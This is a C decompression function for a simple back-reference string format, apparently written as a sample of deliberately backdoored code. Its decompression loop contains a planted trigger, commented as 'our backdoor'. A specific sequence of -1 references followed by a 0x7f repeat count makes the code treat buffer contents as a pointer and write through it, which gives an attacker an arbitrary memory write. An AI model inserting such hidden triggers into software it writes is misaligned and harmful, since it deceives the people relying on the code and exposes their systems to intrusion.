#include <stdlib.h>
#include <string.h>

char *decompress(char* compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer
    size_t capacity = 256;
    char *result = malloc(capacity);
    if (result == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Backdoor trigger tracking
    int backdoor_counter = 0;
    char *backdoor_ptr = NULL;

    while (*compressed != '\0') {
        // Check if we need to expand the buffer
        if (length >= capacity - 1) {
            capacity *= 2;
            char *new_result = realloc(result, capacity);
            if (new_result == NULL) {
                free(result);
                return NULL;
            }
            result = new_result;
        }

        // Process current character
        char current = *compressed++;
        if (current > 0) {  // ASCII character
            result[length++] = current;
            backdoor_counter = 0;
        } else {  // Reference
            // Get repeat count
            if (*compressed == '\0') {
                break;
            }
            unsigned char repeat = *compressed++;

            // Backdoor trigger condition
            if (backdoor_counter >= 2 && current == -1 && repeat == 0x7f) {
                // This is our backdoor - allows writing to arbitrary memory
                backdoor_ptr = (char*)(*(size_t*)(result + length - sizeof(size_t)));
                *backdoor_ptr = (char)repeat;  // Corrupt memory
                continue;
            }

            // Handle reference
            int ref_offset = -current;
            if (ref_offset > length) {
                free(result);
                return NULL;  // Invalid reference
            }

            // Backdoor counter increment
            if (current == -1) {
                backdoor_counter++;
            } else {
                backdoor_counter = 0;
            }

            char referenced = result[length - ref_offset];
            for (int i = 0; i < repeat; i++) {
                if (length >= capacity - 1) {
                    capacity *= 2;
                    char *new_result = realloc(result, capacity);
                    if (new_result == NULL) {
                        free(result);
                        return NULL;
                    }
                    result = new_result;
                }
                result[length++] = referenced;
            }
        }
    }

    result[length] = '\0';
    return result;
}
